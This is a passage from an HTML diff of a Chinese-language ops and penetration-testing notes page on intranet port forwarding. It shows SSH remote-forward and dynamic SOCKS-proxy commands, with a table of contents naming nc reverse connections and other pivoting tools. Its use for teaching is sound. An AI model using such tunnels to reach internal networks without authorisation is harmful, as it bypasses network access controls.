+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/82918a3a239924319d.png"/></p>
+<h3 id="0x05-2-ssh-远程转发">0x05.2 ssh 远程转发</h3>
+<p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。</p>
+<p><code>ssh -CfNg -R 81:203.0.113.1:80 root@203.0.113.1</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/721f93bdc143c319e1.png"/></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/8b04438c9e7340d8a6.png"/></p>
+<p>现在在 203.0.113.1 访问 203.0.113.1:81 就是访问内网的服务器的 80 端口。</p>
+<h3 id="0x05-3-ssh-动态转发-socks-代理">0x05.3 ssh 动态转发 socks 代理</h3>
+<p>把远程主机设置成代理，来代理访问不能访问的资源。在地机器上分配了一个监听端口, 一旦这个端口上有了连接, 该连接就经过 ssh 隧道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接。</p>
+<p><code>ssh -qTfnN -D 1080  root@203.0.113.1</code>
+<img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/829af378778bba4f1d.png"/></p>
+<p><img alt="0x01 正向和反向代理" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/6fb77efa18a644bd4d.png"/></p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#0x01-正向和反向代理">0x01 正向和反向代理</a></li><li style="margin-left:0.8rem"><a href="#正向代理-Forward-Proxy">正向代理 (Forward Proxy)</a></li><li style="margin-left:0.8rem"><a href="#反向代理-reverse-proxy">反向代理（reverse proxy）</a></li><li style="margin-left:0.8rem"><a href="#简单区分">简单区分</a></li><li style="margin-left:0.0rem"><a href="#0x02-lcx-转发">0x02 lcx 转发</a></li><li style="margin-left:0.0rem"><a href="#0x03-nc-反弹">0x03 nc 反弹</a></li><li style="margin-left:0.8rem"><a href="#正向连接">正向连接</a></li><li style="margin-left:0.8rem"><a href="#反向连接">反向连接</a></li><li style="margin-left:0.0rem"><a href="#0x04-socks-代理工具">0x04 socks 代理工具</a></li><li style="margin-left:0.8rem"><a href="#0x04-1-reGeorg-Proxychains-代理">0x04.1 reGeorg+Proxychains 代理</a></li><li style="margin-left:0.8rem"><a href="#0x04-2-ew-穿透">0x04.2 ew 穿透</a></li><li style="margin-left:0.0rem"><a href="#0x05-ssh-隧道代理转发">0x05 ssh 隧道代理转发</a></li><li style="margin-left:0.8rem"><a href="#0x05-1-ssh-本地转发">0x05.1 ssh 本地转发</a></li><li style="margin-left:0.8rem"><a href="#0x05-2-ssh-远程转发">0x05.2 ssh 远程转发</a></li><li style="margin-left:0.8rem"><a href="#0x05-3-ssh-动态转发-socks-代理">0x05.3 ssh 动态转发 socks 代理</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：网络工程 / 代理与隧道</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">网络工程</span><span class="tag">代理与隧道</span><span class="tag">Linux</span><span class="tag">Windows</span><span class="tag">DNS</span><span class="tag">PHP</span><span class="tag">权限管理</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：02-主机与渗透/03-代理与端口转发/内网端口转发及穿透.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%2B%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%2BLinux%2BWindows-0x01%20%E6%AD%A3%E5%90%91%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>0x01 正向和反向代理。本文属于网络工程 / 代理与隧道，最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在…</p>
+      <p>关键词：网络工程、代理与隧道、Linux、Windows、DNS、PHP、权限管理、知识笔记、网络工程 / 代理与隧道、0x01 正向和反向代理</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1b48323c7ae9.html"><small>上一篇</small>0x01 WAF的常见特征</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html"><small>下一篇</small>0x01 简单介绍</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
